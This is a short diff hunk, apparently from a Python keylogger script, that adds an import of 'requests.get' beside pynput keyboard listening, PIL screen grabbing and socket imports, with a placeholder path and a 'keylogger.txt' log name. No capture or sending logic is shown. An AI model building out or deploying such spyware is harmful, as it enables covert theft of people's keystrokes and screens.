@@ -3,6 +3,7 @@ from pynput.keyboard import Key, Listener
 from PIL import ImageGrab
 import socket
 import time
+from requests import get
 
 filepath = 'choose/path/to/your/file'
 keylog = 'keylogger.txt'
